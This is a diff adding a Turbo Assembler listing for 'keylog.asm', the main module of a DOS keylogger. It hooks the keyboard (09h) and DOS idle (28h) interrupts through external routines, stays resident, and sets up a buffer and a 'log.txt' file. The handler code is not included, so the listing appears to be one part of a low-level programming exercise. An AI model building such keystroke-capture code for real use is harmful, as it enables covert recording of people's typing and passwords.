@@ -1,0 +1,102 @@
+Turbo Assembler	 Version 4.1	    03/03/20 16:27:53	    Page 1
+keylog.asm
+
+
+
+      1				     .186
+      2	0000			     .model tiny
+      3	0000			     .code
+      4				     org     100h
+      5
+      6
+      7				     extrn	     rplInt  :proc
+      8
+      9				     extrn	     Old28
+     10				     extrn	     New28   :proc
+     11
+     12				     extrn	     Old09
+     13				     extrn	     New09   :proc
+     14
+     15				     extrn	     EndLabel
+     16
+     17				     public	     BufBeg
+     18				     public	     BufEnd
+     19				     public	     BUF
+     20				     public	     COUNT
+     21				     public	     filespec
+     22
+     23	0100  C6 06 010Er 00 90	     Start:	     mov     COUNT, 0
+     24
+     25	0106  B9 0028				     mov     cx, 28h
+     26	0109  BF 0000e				     mov     di, offset	Old28
+     27	010C  BE 0000e				     mov     si, offset	New28
+     28
+     29	010F  E8 0000e				     call    rplInt
+     30
+     31	0112  B9 0009				     mov     cx, 09h
+     32	0115  BF 0000e				     mov     di, offset	Old09
+     33	0118  BE 0000e				     mov     si, offset	New09
+     34
+     35	011B  E8 0000e				     call    rplInt
+     36
+     37	011E  B8 3100				     mov     ax, 3100h
+     38	0121  BA 0000e				     mov     dx, offset	EndLabel
+     39	0124  C1 EA 04				     shr     dx, 4
+     40	0127  42				     inc     dx
+     41	0128  CD 21				     int     21h
+     42
+     43	012A			     .data
+     44
+     45	0000  6C 6F 67 2E 74 78	74+  filespec	     db	'log.txt', 0h
+     46	      00
+     47
+     48	0008  00		     BufBeg	     db	     0h
+     49	0009  00		     BufEnd	     db	     0h
+     50
+     51	000A  0104*(00)		     BUF	     db	260d dup(0)  ;BUF[0..255]
+     52
+     53	010E  00		     COUNT	     db	     0h
+     54				     end     Start
+Turbo Assembler	 Version 4.1	    03/03/20 16:27:53	    Page 2
+Symbol Table
+
+
+
+
+Symbol Name			  Type	 Value
+
+??DATE				  Text	 "03/03/20"
+??FILENAME			  Text	 "keylog  "
+??TIME				  Text	 "16:27:53"
+??VERSION			  Number 040A
+@32BIT				  Text	 0
+@CODE				  Text	 DGROUP
+@CODESIZE			  Text	 0
+@CPU				  Text	 0103H
+@CURSEG				  Text	 _DATA
+@DATA				  Text	 DGROUP
+@DATASIZE			  Text	 0
+@FILENAME			  Text	 KEYLOG
+@INTERFACE			  Text	 000H
+@MODEL				  Text	 1
+@STACK				  Text	 DGROUP
+@WORDSIZE			  Text	 2
+BUF				  Byte	 DGROUP:000A
+BUFBEG				  Byte	 DGROUP:0008
+BUFEND				  Byte	 DGROUP:0009
+COUNT				  Byte	 DGROUP:010E
+ENDLABEL			  Word	 DGROUP:---- Extern
+FILESPEC			  Byte	 DGROUP:0000
+NEW09				  Near	 DGROUP:---- Extern
+NEW28				  Near	 DGROUP:---- Extern
+OLD09				  Word	 DGROUP:---- Extern
+OLD28				  Word	 DGROUP:---- Extern
+RPLINT				  Near	 DGROUP:---- Extern
+START				  Near	 DGROUP:0100
+
+Groups & Segments		  Bit Size Align  Combine Class
+
+DGROUP				  Group
+  _DATA				  16  010F Word	  Public  DATA
+  _TEXT				  16  012A Word	  Public  CODE
+
